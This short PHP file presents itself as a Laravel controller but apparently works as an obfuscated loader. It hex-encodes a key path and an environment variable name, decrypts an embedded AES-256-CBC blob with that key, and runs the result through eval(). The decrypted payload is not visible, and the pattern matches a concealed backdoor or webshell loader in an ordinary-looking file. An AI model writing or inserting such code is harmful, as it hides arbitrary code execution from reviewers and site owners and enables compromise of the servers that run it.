<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dAXr/5Sk5FChVHgyk/eZeQ==');

$c=base64_decode(

'FsQzBrNurhmO6GyFPXoFllntXo6dY6yPJJByrq/0CWyg92MterVIClxIoR6QXxI4WP0K+Q3tVqQi' .
'WBuBXrTsK+X6UCsyD8JWAU++4N3x/UFqsTBV5Mb4zDpIy/Dkd+n5FUt8ZYDW9Zsy4J55yaGmGHam' .
'HXZwgen3ux33alJ/7Yp0K+GLGv2gMBnqO2adpuFSp5azoAp0dc7DcVvmTF6CjL0zJm0vQvj3jjax' .
'Hfcmw31N05APBLgFCQ7khO18xzXu'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

